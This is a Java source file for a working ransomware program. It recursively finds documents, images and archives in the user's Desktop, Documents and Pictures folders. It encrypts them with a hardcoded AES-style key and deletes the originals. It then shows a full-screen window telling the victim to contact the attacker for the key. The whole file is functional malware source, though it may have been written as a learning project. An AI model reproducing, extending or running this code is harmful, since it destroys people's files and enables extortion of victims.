package com.company;

import org.apache.commons.io.FileUtils;
import java.io.*;
import java.util.*;
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;


public class Main {

    static JFrame f; //This is for creating Graphical Form
    static JLabel l; //This is for holding a text

    public enum OS{

        WINDOWS,LINUX,MAC
    };

    private static OS os=null;
    //128Bit key but can be extended to different length
    public static String key="UkXp2s5u8x/A?D(G";
    public static void main(String[] args) {

       FileFinder(); //Find important files and Encrypts
        Warning();
    }
    // UI design in the warning method
    public static void Warning()
    {
        f=new JFrame("Warning");
        l=new JLabel();
        l.setText("Warning : All important files are encrypted :( In order to decrypt these files contact " +
                "the attacker to get the key to decrypt your files");
        JPanel p= new JPanel();
        p.add(l);
        f.add(p);

        //Input key For Restoring Files

        JPanel panel= new JPanel();
        JLabel label= new JLabel("Enter the key at the Box in the bottom");
        JTextField tf= new JTextField(10);
        JButton submit=new JButton("Restore Files");
        submit.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {

                String strVkey=tf.getText();
                if(strVkey.equalsIgnoreCase(key))
                {
                    JOptionPane.showMessageDialog(f,"BINGO key is correct. Files are being Decrypted");
                    //Decrypt the encrypted files.
                    FileFinder("abc");
                }
                else
                {
                    JOptionPane.showMessageDialog(f,"Incorrect Key :(");

                }
            }
        });
        JButton reset= new JButton("Reset Key");
        reset.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                tf.setText("");
            }
        });

        panel.add(label);
        panel.add(tf);
        panel.add(submit);
        panel.add(reset);

        f.getContentPane().add(BorderLayout.NORTH,label);
        f.getContentPane().add(BorderLayout.SOUTH,panel);

        f.setVisible(true);
        // to show the panel in fullScreen
        f.setExtendedState(JFrame.MAXIMIZED_BOTH);
        f.setUndecorated(true);
        f.setVisible(true);


    }
    public static void FileFinder(){

        switch(getOS()){

            case WINDOWS:
                //look for windows sensitive paths in machine
                System.out.println("This is Windows");
            case LINUX:
                //Linux paths
                System.out.println("This is Linux");
            case MAC:
                //Mac paths
                System.out.println("This is mac");
        }

        ArrayList<String> CriticalPathList=new ArrayList<String>();
        // Add sensitive Directories to the list

        CriticalPathList.add(System.getProperty("user.home")+"/Desktop");
        CriticalPathList.add(System.getProperty("user.home")+"/Documents");
        CriticalPathList.add(System.getProperty("user.home")+"/Pictures"); //read+write Permissions.

        for(String TargetDirectory:CriticalPathList)
        {
            File root=new File(TargetDirectory);
            try{
                String[] extensions={"pdf","docx","txt","zip","png","doc","jpg","xlsx"};

                Collection files= FileUtils.listFiles(root,extensions,true);

                for(Object o: files){
                    File file=(File) o;
                        Encryptor(file.getAbsolutePath());
                }
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        }
    }

    public static void FileFinder(String ext){

        switch(getOS()){

            case WINDOWS:
                //look for windows paths in machine
                System.out.println("This is Windows");
            case LINUX:
                //Linux paths
                System.out.println("This is Linux");
            case MAC:
                //Mac paths
                System.out.println("This is mac");
        }

        ArrayList<String> CriticalPathList=new ArrayList<String>();
        // Add sensitive Directories to the list

        CriticalPathList.add(System.getProperty("user.home")+"/Desktop");
        CriticalPathList.add(System.getProperty("user.home")+"/Documents");
        CriticalPathList.add(System.getProperty("user.home")+"/Pictures"); //read+write Permissions.

        for(String TargetDirectory:CriticalPathList)
        {
            File root=new File(TargetDirectory);
            try{
                String[] extensions={"encrypted"};

                Collection files= FileUtils.listFiles(root,extensions,true);

                for(Object o: files){
                    File file=(File) o;
                    Decryptor(file.getAbsolutePath());
                }
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        }
    }

    public static void Encryptor(String TargetFilePath){

        File targetFile=new File(TargetFilePath); //hello.txt
        File encryptedTargetFile=new File(TargetFilePath +".encrypted"); //hello.txt.encrypted

        try{
            CryptoUtils.encrypt(key,targetFile,encryptedTargetFile);
        }
        catch (CryptoException ex) {
            ex.printStackTrace();
        }

        targetFile.delete();

    }

    public static void Decryptor(String EncryptedFilePath){

            File targetFile=new File(EncryptedFilePath); //private.txt.encrypted which is the name after encryption
            File decryptedTargetFile=new File(EncryptedFilePath.replace(".encrypted","")); // Private.txt

        try {

            CryptoUtils.decrypt(key, targetFile, decryptedTargetFile);
        }
        catch (CryptoException ex){
                ex.printStackTrace();
        }

        targetFile.delete();
    }

    // This method identifies the operating system
    public static OS getOS() {
        if (os == null) {
            String operSys = System.getProperty("os.name").toLowerCase();
            if (operSys.contains("win")) {
                os = OS.WINDOWS;
            } else if (operSys.contains("nix") || operSys.contains("nux") || operSys.contains("aix")) {
                //Linux kali,Ubuntu unix based
                os = OS.LINUX;
            } else if (operSys.contains("mac")) {
                os = OS.MAC;
            }
        }
        return os;

    }
}
